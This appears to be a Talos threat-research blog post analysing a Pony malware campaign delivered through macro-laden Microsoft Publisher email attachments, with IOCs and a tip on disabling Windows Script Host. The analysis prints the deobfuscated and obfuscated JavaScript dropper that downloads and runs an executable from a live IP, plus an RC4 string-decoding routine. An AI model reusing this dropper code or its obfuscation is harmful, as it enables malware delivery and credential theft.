@@ -1,0 +1,446 @@
+
+When A Pony Walks Out Of A Pub
+
+
+
+
+
+
+This blog was authored by Warren Mercer and Paul Rascagneres.
+
+Talos has observed a small email campaign leveraging the use of Microsoft Publisher files. These .pub files are normally used for the publishing of documents such as newsletters, allowing  users to create such documents using familiar office functions such as mail merging. Unlike  other applications within the Microsoft Office suite, Microsoft Publisher does not support a 'Protected View' mode. This is a read only mode which can help end users remain protected from malicious document files. Microsoft Publisher is included and installed by default in Office 365.
+
+The file used in this campaign was aimed at infecting the victim with the, well known, Pony malware. Whilst Pony is well documented in technical capability it has not been known to use the .pub file format until now. Pony is a credential harvesting piece of malware with other trojan capabilities. In addition to credential harvesting, it is also commonly deployed as a malware loader and used to infect systems with additional malware in multi-stage infection chains. Pony is still used heavily as the sources of multiple Pony versions leaked thus making it much easier for other malicious actors to implement Pony into their infection chain.
+
+
+
+The Pub
+This campaign was delivered using email attachments which is a very common method of infection for old and new malware. The difference here is the use of .pub files. The attached file was delivered to the end user as "skbmt_fax45.pub" the attacker made no attempt to try to hide the file type. Frequently we see attackers hiding the true file type within a .zip compressed file. However, the 'SKBMT' name can be misread as part of the 'SKMBT' prefix used by Konica Minolta scanner (SKMBT - Scan Konica Minolta Business Technologies). The file was a seemingly legitimate Microsoft Publisher file.
+
+
+
+
+
+In the email the attacker tries to entice the user to open the email by asking for services from the end user. In this instance claims referencing a financing requirement, and 'Chief Operating Officer' provide further enticement to the user that the sender is legitimate.
+
+The analysis begins with the .pub attachment. Upon execution the file appears to crash Microsoft Publisher and the user is presented with a timer showing that the file is currently being opened. Talos believe this freeze is due to the 2MB macro file being loaded during the opening of the .pub file.
+
+
+
+
+
+After a few moments the Publisher application appears to crash and starts to exhibit the 'Not Responding' message suggesting the application has crashed
+
+
+
+
+This message times out and Publisher will resume running - at this stage the user is presented with a blank Microsoft Publisher environment displaying a seemingly an empty file… of course avid malware hunters out there know anything that opens, crashes then becomes blank is normally an indication of something malicious going on in the background! At this stage it was time to start paying attention to the file as opposed to its immediate contents.
+
+We begin our analysis using OleDump and we are able to quickly identify a large 2MB+ macro existing within the malicious publisher file.
+
+
+
+
+
+We then turn to using OleVBA  to continue our analysis on the file itself - as with many Office format based attacks the use of embedded macros is very common and we expected no less with this particular sample.
+
+
+
+
+
+Exploring the Macro contents led to the following, as seen in the IOC output from OleVBA, the 'letten.js' file...
+
+
+
+
+
+What we found was a macro which was used to write an object file a 430K~ 'letten.js' file onto disk. The macro achieved this by using a 'CreateObject' method and using multiple 'DumpFile' objects which slowly wrote the file to disk.
+
+
+
+
+
+The DumpFile objects are written to disk as follows...
+
+
+
+
+
+And eventually what is written is a malicious .js file which is heavily obfuscated.
+
+
+
+
+
+JS Obfuscation
+Now we've identified the Pub file does indeed contain more than meets the eye we begin analysis on the embedded .js mentioned above. Initially we find a heavily obfuscated piece of Javascript -- remember this is the cool kids' language of choice now -- but we can easily overcome this obfuscation. The obfuscation is divided into 2 layers. The first layer decrypts data in order to perform an eval() on the clear text. Not surprisingly the eval reveals another layer of obfuscated Javascript!
+
+
+
+
+
+The second script is obfuscated too. The obfuscation mechanisms are mainly based on string hiding. We identified 2 techniques used to perform this task:
+
+
+
+String obfuscation by using the hexadecimal value instead of the ASCII character:
+var NDpKxelW=new ActiveXObject('\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c');
+Becomes:
+var NDpKxelW=new ActiveXObject('WScript.Shell');
+
+
+
+
+String obfuscation by using RC4 encryption, here is an example:
+var WJYT=new ActiveXObject(_0('0x0','\x71\x75\x72\x70'));
+
+In this case, the function _0() is called with 2 arguments: an index and an RC4 encryption key. The index is used to identify the string to decrypt. You can see the nodejs script used to decrypt these strings in Appendix A. The Appendix B contains all the decrypted strings. The string above becomes:
+var WJYT=new ActiveXObject('Scripting.FileSystemObject');
+
+
+
+
+The second piece of JavaScript contains some odd code as there are portions of useless code in relation to an embedded image file, we were unable to identify any significant use for this code. Once decrypted, we can easily identify the purpose of the 2nd piece of JavaScript:
+
+var ws=new ActiveXObject('WScript.Shell');
+var fs=new ActiveXObject('Scripting.FileSystemObject');
+var exe_path=fs[GetSpecialFolder](0x2)+'\\'+"kl.pub"; // %TEMP%\kl.pub
+var as=new ActiveXObject('ADODB.Stream');
+as['Open']();
+as['Type']=0x1;
+as['Position']=0x0;
+var http=new ActiveXObject('WinHTTP.WinHTTPRequest.5.1');
+http['open'](),('http://5.200.52.198/flex/3435dde3r.exe',0x0);
+http['send']();
+if(http['Status']==0xc8){
+  as['Write'](http['ResponseBody']);
+  if(fs['FileExists'](exe_path))
+    fs['DeleteFile'](exe_path);
+  as['SaveToFile'](exe_path);
+  as['Close'];
+  if(!fs['FileExists'](exe_path))
+    fs['DeleteFile'](exe_path);
+  var command='cmd.exe /c'+exe_path;
+  ws['Run'](command,0x0)
+}
+
+The purpose is to download a binary from hxxp://5.200.52.198/flex/3435dde3r.exe, to the users TEMP folder, rename the downloaded file to kl.pub and finally execute the malicious binary.
+
+
+Payload
+Upon completion of our analysis we identified the malware payload as Pony. Pony is not a new piece of malware and is well documented and well understood by the security community. Pony is mainly used for password stealing and credential harvesting. The use of the .pub file as a delivery mechanism and the obfuscated Javascript was the new features within this Pony campaign. A small point of note was this campaign was relatively unsuccessful in terms of  outbound connectivity. Using Cisco Umbrella we were able to identify a low number of connections to the C2 infrastructure.
+
+
+
+
+
+Conclusion
+The article demonstrates how cyber-criminal use standard Macros in the Office Publisher application associated with multi-layer obfuscated JavaScript to install malware on systems. We strongly recommend never to open unknown documents or anything from an unknown sender/source. In addition, Microsoft Windows allows Windows Script Host to be disabled by creating the registry key (REG_DWORD):
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled
+
+with the value set to '0'
+
+To disable WSH for all users of a particular computer, create this entry:
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled
+
+More information about disabling WSH execution can be found on the Microsoft website.
+
+
+IOCs
+
+Network
+
+
+hxxp://5.200.52.198/flex/3435dde3r.exe (payload)
+
+hxxp://195.22.127.233/rec/fre.php (Pony CC)
+
+hxxp://kbfvzoboss.bid/alien/fre.php (Pony CC)
+
+hxxp://195.22.127.233/rec/fre.php (Pony CC)
+
+hxxp://alphastand.win/alien/fre.php (Pony CC)
+
+hxxp://alphastand.top/alien/fre.php (Pony CC)
+
+hxxp://alphastand.trade/alien/fre.php (Pony CC)
+
+hxxp://195.22.127.233:80/rec/fre.php (Pony CC)
+
+5.200.52.198
+
+195.22.127.233
+
+kbfvzoboss.bid
+
+alphastand.win
+
+alphastand.top
+
+alphastand.trade
+
+
+
+Hashes
+
+
+3cfd8919​f095e048​e0f24a41​c2f13232​8f0d0efe​19581b30​8d9d2d3f​fad40c29​ (skbmt_fax45.pub)
+
+36baccd2a4fc4f683c839283123a75de61b01ce93205f4a34975263e9c66aaed (skbmt_faxreport34.pub)
+
+42d0990daba69fa5068a6910d0eac487f3d308ce7e28799a959dace8d84125d7 (letten.js)
+
+d214c89af1929af1171ac40999b14a4f6fbcfd13b88cade392853a2c61057122 (payload)
+
+c7ef89222d760fc915690e6394c61c84176e618f7c9508beca30aa9a0f1b1991 (payload)
+
+
+ThreatGrid Report
+
+https://panacea.threatgrid.com/samples/4a9c0827d5b35645706c2fb550e223ce
+
+
+Coverage
+Additional ways our customers can detect and block this threat are listed below.
+
+
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
+
+CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.
+
+Email Security can block malicious emails sent by threat actors as part of their campaign.
+
+The Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.
+
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.
+
+Umbrella prevents DNS resolution of the domains associated with malicious activity.
+
+
+Appendix A
+(
+  function(_17,_31){
+     var _27=function(_28){
+       while(--_28){_17['push'](_17['shift']())}
+     };
+     _27(++_31)
+  } (_16,0x1af)
+
+);
+
+
+var _0=function(_6,_29){
+   var _6=parseInt(_6,0x10);
+   var _7=_16[_6];
+   if(!_0['atobPolyfillAppended']){
+      ( function(){
+           var _23=Function('return (function () {}.constructor("return this")());');
+           var _15=_23();
+           var _37='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+           _15['atob']||(_15['atob']=function(_25){
+              var _24=String(_25)['replace'](/=+$/,'');
+              for(var _10=0x0,_9,_5,_30=0x0,_19=''; _5=_24['charAt'](_30++); ~_5&&(_9=_10%0x4?_9*0x40+_5:_5,_10++%0x4)?_19+=String['fromCharCode'](0xff&_9>>(-0x2*_10&0x6)):0x0){
+                 _5=_37['indexOf'](_5)
+              }
+              return _19
+           })
+        }()
+      );
+     _0['atobPolyfillAppended']=!![]
+   }
+
+   if(!_0['rc4']){
+     var _26=function(_4,_18)
+       {
+       var _2=[],_3=0x0,_8,_20='',_14='';
+       _4=atob(_4);
+       for(var _11=0x0,_33=_4['length']; _11<_33; _11++){
+          _14+='%'+('00'+_4['charCodeAt'](_11)['toString'](0x10))['slice'](-0x2)
+       }
+       _4=decodeURIComponent(_14);
+       for(var _1=0x0; _1<0x100; _1++){
+         _2[_1]=_1
+       }
+       for(_1=0x0; _1<0x100; _1++){
+         _3=(_3+_2[_1]+_18['charCodeAt'](_1%_18['length']))%0x100;
+         _8=_2[_1];
+         _2[_1]=_2[_3];
+         _2[_3]=_8
+       }
+       _1=0x0;
+       _3=0x0;
+       for(var _12=0x0; _12<_4['length']; _12++){
+         _1=(_1+0x1)%0x100;
+         _3=(_3+_2[_1])%0x100;
+         _8=_2[_1];
+         _2[_1]=_2[_3];
+         _2[_3]=_8;
+         _20+=String['fromCharCode'](_4['charCodeAt'](_12)^_2[(_2[_1]+_2[_3])%0x100])
+       }
+       return _20
+     };
+     _0['rc4']=_26
+   }
+
+
+   if(!_0['data']){
+     _0['data']={}
+   }
+
+   if(_0['data'][_6]===undefined){
+     if(!_0['once']){
+       _0['once']=!![]
+     }_7=_0['rc4'](_7,_29);
+     _0['data'][_6]=_7
+   } else {
+     _7=_0['data'][_6]
+   }
+   return _7
+};
+
+
+console.log(_0('0x0','\x71\x75\x72\x70'));
+console.log(_0('0x1','\x58\x30\x4c\x4c'));
+console.log(_0('0x2','\x53\x58\x5e\x6f'));
+console.log(_0('0x3','\x35\x75\x62\x5a'));
+console.log(_0('0x5','\x39\x52\x31\x36'));
+console.log(_0('0x7','\x26\x37\x38\x62'));
+console.log(_0('0x9','\x4c\x35\x62\x45'));
+console.log(_0('0xb','\x73\x23\x35\x42'));
+console.log(_0('0xc','\x24\x4f\x25\x37'));
+console.log(_0('0xd','\x41\x75\x73\x46'));
+console.log(_0('0xf','\x79\x67\x5d\x79'));
+console.log(_0('0x11','\x4d\x42\x54\x69'));
+console.log(_0('0x14','\x63\x54\x6a\x24'));
+console.log(_0('0x15','\x79\x39\x21\x6a'));
+console.log(_0('0x17','\x45\x61\x51\x6a'));
+console.log(_0('0x1a','\x79\x72\x68\x70'));
+console.log(_0('0x1c','\x53\x58\x5e\x6f'));
+console.log(_0('0x1d','\x31\x23\x48\x6c'));
+console.log(_0('0x1e','\x31\x23\x48\x6c'));
+console.log(_0('0x20','\x72\x78\x5e\x4e'));
+console.log(_0('0x23','\x26\x35\x6a\x6a'));
+console.log(_0('0x25','\x38\x66\x39\x5a'));
+console.log(_0('0x26','\x73\x23\x35\x42'));
+console.log(_0('0x27','\x4a\x45\x41\x62'));
+console.log(_0('0x2a','\x24\x4f\x25\x37'));
+console.log(_0('0x2c','\x2a\x46\x4a\x51'));
+console.log(_0('0x2e','\x45\x61\x51\x6a'));
+console.log(_0('0x2f','\x52\x4f\x5d\x45'));
+console.log(_0('0x30','\x79\x67\x5d\x79'));
+console.log(_0('0x31','\x70\x6f\x46\x54'));
+console.log(_0('0x32','\x45\x61\x51\x6a'));
+console.log(_0('0x33','\x79\x39\x54\x2a'));
+console.log(_0('0x34','\x52\x4f\x5d\x45'));
+console.log(_0('0x35','\x35\x72\x4a\x2a'));
+console.log(_0('0x36','\x58\x61\x5e\x6a'));
+console.log(_0('0x37','\x79\x67\x5d\x79'));
+console.log(_0('0x38','\x52\x4f\x5d\x45'));
+console.log(_0('0x39','\x2a\x46\x4a\x51'));
+console.log(_0('0x3a','\x73\x23\x35\x42'));
+console.log(_0('0x3b','\x35\x75\x62\x5a'));
+console.log(_0('0x3c','\x4d\x42\x54\x69'));
+console.log(_0('0x3d','\x70\x6f\x46\x54'));
+console.log(_0('0x3e','\x31\x23\x48\x6c'));
+console.log(_0('0x3f','\x25\x2a\x4a\x4c'));
+console.log(_0('0x41','\x50\x30\x70\x4b'));
+console.log(_0('0x43','\x2a\x46\x4a\x51'));
+console.log(_0('0x45','\x53\x58\x5e\x6f'));
+console.log(_0('0x47','\x57\x28\x30\x76'));
+console.log(_0('0x48','\x35\x5a\x54\x39'));
+console.log(_0('0x49','\x4d\x42\x54\x69'));
+console.log(_0('0x4b','\x52\x4f\x5d\x45'));
+console.log(_0('0x4d','\x45\x61\x51\x6a'));
+console.log(_0('0x4f','\x72\x78\x5e\x4e'));
+console.log(_0('0x50','\x70\x6f\x46\x54'));
+
+
+
+Appendix B
+_0('0x0','\x71\x75\x72\x70'):  Scripting.FileSystemObject
+_0('0x1','\x58\x30\x4c\x4c'):  GetSpecialFolder
+_0('0x2','\x53\x58\x5e\x6f'):  kl.pub
+_0('0x3','\x35\x75\x62\x5a'):  ADODB.Stream
+_0('0x5','\x39\x52\x31\x36'):  Open
+_0('0x7','\x26\x37\x38\x62'):  Type
+_0('0x9','\x4c\x35\x62\x45'):  WinHttp.WinHttpRequest.5.1
+_0('0xb','\x73\x23\x35\x42'):  open
+_0('0xc','\x24\x4f\x25\x37'):  
+_0('0xd','\x41\x75\x73\x46'):  http://5.200.52.198/flex/3435dde3r.exe
+_0('0xf','\x79\x67\x5d\x79'):  send
+_0('0x11','\x4d\x42\x54\x69'): Status
+_0('0x14','\x63\x54\x6a\x24'): ResponseBody
+_0('0x15','\x79\x39\x21\x6a'): FileExists
+_0('0x17','\x45\x61\x51\x6a'): DeleteFile
+_0('0x1a','\x79\x72\x68\x70'): Close
+_0('0x1c','\x53\x58\x5e\x6f'): FileExists
+_0('0x1d','\x31\x23\x48\x6c'): DeleteFile
+_0('0x1e','\x31\x23\x48\x6c'): cmd.exe /c
+_0('0x20','\x72\x78\x5e\x4e'): fba7b60b15f0b26aa5b56b8f378a0b1b4092ed23d3d08e9b5b86f70e54b4fbeb55757642
+_0('0x23','\x26\x35\x6a\x6a'): getContext
+_0('0x25','\x38\x66\x39\x5a'): text
+_0('0x26','\x73\x23\x35\x42'): 6cc71d91778fcdda0eb8709e9348240b251afe5e971df8f80920b84ab4eeae83cae6b76c
+_0('0x27','\x4a\x45\x41\x62'): 138825ed8f4199d67f9ca400b795b65fec1158ac4fd0e81a93f0b42abf77047ac4811a76
+_0('0x2a','\x24\x4f\x25\x37'): display
+_0('0x2c','\x2a\x46\x4a\x51'): onload
+_0('0x2e','\x45\x61\x51\x6a'):
+_0('0x2f','\x52\x4f\x5d\x45'): v269f82b2b41157791bb2ed68074f252a
+_0('0x30','\x79\x67\x5d\x79'): return unescape(decodeURIComponent(window.atob(v269f82b2b41157791bb2ed68074f252a)))
+_0('0x31','\x70\x6f\x46\x54'): v269f82b2b41157791bb2ed68074f252a
+_0('0x32','\x45\x61\x51\x6a'): cmV0dXJuJTIwJ2NhbnZhcyclM0I= ==> return%20'canvas'%3B
+_0('0x33','\x79\x39\x54\x2a'): cmV0dXJuJTIwJzJkJyUzQg== ==> return%20'2d'%3B
+_0('0x34','\x52\x4f\x5d\x45'): cmV0dXJuJTIwJ3NjcmlwdCclM0I= ==> return%20'script'%3B
+_0('0x35','\x35\x72\x4a\x2a'): vd547050f5153d6953e12ea54b398855a
+_0('0x36','\x58\x61\x5e\x6a'): vaf2802b25cf6c34b77597f03a57f3f72
+_0('0x37','\x79\x67\x5d\x79'): cmV0dXJuJTIwJ2RhdGElM0FpbWFnZSUyRnBuZyUzQmJhc2U2NCUyQyclM0I= ==> return%20'data%3Aimage%2Fpng%3Bbase64%2C'%3B
+_0('0x38','\x52\x4f\x5d\x45'): iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAABCklEQVQYlSXPzUpUAQAG0HOHW/ZZ0KhYuMlFILgrBINq34u09RXbWdQiWgnZrpAgpx+j5rPUmRadNzjDwcFzDe+bPd7pQh7GBUftRTLj0agnzX1uMU/Xmj/pm2bgLgtW6/WI9EMtud5If4A1XZE5n3g2YaswjWusQqSN83TQ3Tgba4hTVlimV2zWFzlhoZfJL30woc3TuiFDnddxOqbYkm86bYzym22ZsU5kk9vsccqU7ZhN0nV9Gxu1lO+xo2oIqTpuNyYysMOl0pHD5g5/2yVjsh/jRIfkpf5vLeqJHuuLZN6sccRiRPs4lslNvdKjZFn3im7KV3k1acQhH9uzBiNNd/VnfGZL9/8BN0KFZOkfxykAAAAASUVORK5CYII= ==> a .png file
+_0('0x39','\x2a\x46\x4a\x51'): cmV0dXJuJTIwdjE2NDQxZWY5MzA0YTU1MjBkNjYzZTY1ODBiZjE2Njc5LmdldEVsZW1lbnRCeUlkKHYyNjlmODJiMmI0MTE1Nzc5MWJiMmVkNjgwNzRmMjUyYSklM0I ==> return%20v16441ef9304a5520d663e6580bf16679.getElementById(v269f82b2b41157791bb2ed68074f252a)%3B
+_0('0x3a','\x73\x23\x35\x42'): cmV0dXJuJTIwZG9jdW1lbnQ= ==> return%20document
+_0('0x3b','\x35\x75\x62\x5a'): Zm9yKHZmZmI2NzlhNGViODJjNmVhN2U2MjM0ODc1MmRmZThkYSUzRHY0MjZjNGU1ZWRmM2EwMGM1YjA2Njg3MjM0YTEyMDVkZSU1QjIlNUQlM0IlMjB2ZmZiNjc5YTRlYjgyYzZlYTdlNjIzNDg3NTJkZmU4ZGElMjAlM0MlMjB2ZWNlYjgzNjgxMWJjOTRjMDAyNjU5MjZiZGIwNjgwMGQuZGF0YS5sZW5ndGglM0IlMjB2ZmZiNjc5YTRlYjgyYzZlYTdlNjIzNDg3NTJkZmU4ZGElMkIlM0Q0KXY1MzZkZmMyOGFkMDMxY2EyMTE1MmQyN2Q4NDViNTVmNyUyQiUzRCh2ZWNlYjgzNjgxMWJjOTRjMDAyNjU5MjZiZGIwNjgwMGQuZGF0YSU1QnZmZmI2NzlhNGViODJjNmVhN2U2MjM0ODc1MmRmZThkYSU1RCElM0R2NDI2YzRlNWVkZjNhMDBjNWIwNjY4NzIzNGExMjA1ZGUlNUIxJTVEKSUzRnZmNWQ3ZDMyZGI3YTg3YjU2Y2Q3M2M5Mzk2YWRjMzEwYSh2ZWNlYjgzNjgxMWJjOTRjMDAyNjU5MjZiZGIwNjgwMGQuZGF0YSU1QnZmZmI2NzlhNGViODJjNmVhN2U2MjM0ODc1MmRmZThkYSU1RCklM0F2MjFhM2QyZDNmYzVjMmMxZTFmM2E2MzNiZDhmMTZmN2UlNUI0JTVEJTNCJTIwdjUzNmRmYzI4YWQwMzFjYTIxMTUyZDI3ZDg0NWI1NWY3JTNEdjUzNmRmYzI4YWQwMzFjYTIxMTUyZDI3ZDg0NWI1NWY3LnRyaW0oKSUzQg== ==> for(vffb679a4eb82c6ea7e62348752dfe8da%3Dv426c4e5edf3a00c5b06687234a1205de%5B2%5D%3B%20vffb679a4eb82c6ea7e62348752dfe8da%20%3C%20veceb836811bc94c00265926bdb06800d.data.length%3B%20vffb679a4eb82c6ea7e62348752dfe8da%2B%3D4)v536dfc28ad031ca21152d27d845b55f7%2B%3D(veceb836811bc94c00265926bdb06800d.data%5Bvffb679a4eb82c6ea7e62348752dfe8da%5D!%3Dv426c4e5edf3a00c5b06687234a1205de%5B1%5D)%3Fvf5d7d32db7a87b56cd73c9396adc310a(veceb836811bc94c00265926bdb06800d.data%5Bvffb679a4eb82c6ea7e62348752dfe8da%5D)%3Av21a3d2d3fc5c2c1e1f3a633bd8f16f7e%5B4%5D%3B%20v536dfc28ad031ca21152d27d845b55f7%3Dv536dfc28ad031ca21152d27d845b55f7.trim()%3B
+_0('0x3c','\x4d\x42\x54\x69'): cmV0dXJuJTIwbmV3JTIwSW1hZ2UoKSUzQg== ==> return%20new%20Image()%3B
+_0('0x3d','\x70\x6f\x46\x54'): cmV0dXJuJTIwU3RyaW5nLmZyb21DaGFyQ29kZSh2MjY5ZjgyYjJiNDExNTc3OTFiYjJlZDY4MDc0ZjI1MmEpJTNC ==> return%20String.fromCharCode(v269f82b2b41157791bb2ed68074f252a)%3B
+_0('0x3e','\x31\x23\x48\x6c'): v269f82b2b41157791bb2ed68074f252a
+_0('0x3f','\x25\x2a\x4a\x4c'): width
+_0('0x41','\x50\x30\x70\x4b'): width
+_0('0x43','\x2a\x46\x4a\x51'): height
+_0('0x45','\x53\x58\x5e\x6f'): height
+_0('0x47','\x57\x28\x30\x76'): style
+_0('0x48','\x35\x5a\x54\x39'): display
+_0('0x49','\x4d\x42\x54\x69'): v269f82b2b41157791bb2ed68074f252a
+_0('0x4b','\x52\x4f\x5d\x45'): drawImage
+_0('0x4d','\x45\x61\x51\x6a'): getImageData
+_0('0x4f','\x72\x78\x5e\x4e'): width
+_0('0x50','\x70\x6f\x46\x54'): height
+
+
+Appendix C
+2nd .js (interesting part):
+
+var NDpKxelW=new ActiveXObject('\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c');
+var WJYT=new ActiveXObject(_0('0x0','\x71\x75\x72\x70'));
+var shKsim=WJYT[_0('0x1','\x58\x30\x4c\x4c')](0x2)+'\x5c'+_0('0x2','\x53\x58\x5e\x6f');
+var LKGKUCoW=new ActiveXObject(_0('0x3','\x35\x75\x62\x5a'));
+LKGKUCoW[_0('0x5','\x39\x52\x31\x36')]();
+LKGKUCoW[_0('0x7','\x26\x37\x38\x62')]=0x1;
+LKGKUCoW['\x50\x6f\x73\x69\x74\x69\x6f\x6e']=0x0;
+var UhBHCFrnd=new ActiveXObject(_0('0x9','\x4c\x35\x62\x45'));
+UhBHCFrnd[_0('0xb','\x73\x23\x35\x42')](_0('0xc','\x24\x4f\x25\x37'),_0('0xd','\x41\x75\x73\x46'),0x0);
+UhBHCFrnd[_0('0xf','\x79\x67\x5d\x79')]();
+if(UhBHCFrnd[_0('0x11','\x4d\x42\x54\x69')]==0xc8){
+  LKGKUCoW['\x57\x72\x69\x74\x65'](UhBHCFrnd[_0('0x14','\x63\x54\x6a\x24')]);
+  if(WJYT[_0('0x15','\x79\x39\x21\x6a')](shKsim))
+    WJYT[_0('0x17','\x45\x61\x51\x6a')](shKsim);
+  LKGKUCoW['\x53\x61\x76\x65\x54\x6f\x46\x69\x6c\x65'](shKsim);
+  LKGKUCoW[_0('0x1a','\x79\x72\x68\x70')];
+  if(!WJYT[_0('0x1c','\x53\x58\x5e\x6f')](shKsim))
+    WJYT[_0('0x1d','\x31\x23\x48\x6c')](shKsim);
+  var OGddGp=_0('0x1e','\x31\x23\x48\x6c')+shKsim;
+  NDpKxelW['\x72\x75\x6e'](OGddGp,0x0)
+  }
+
+
+
+
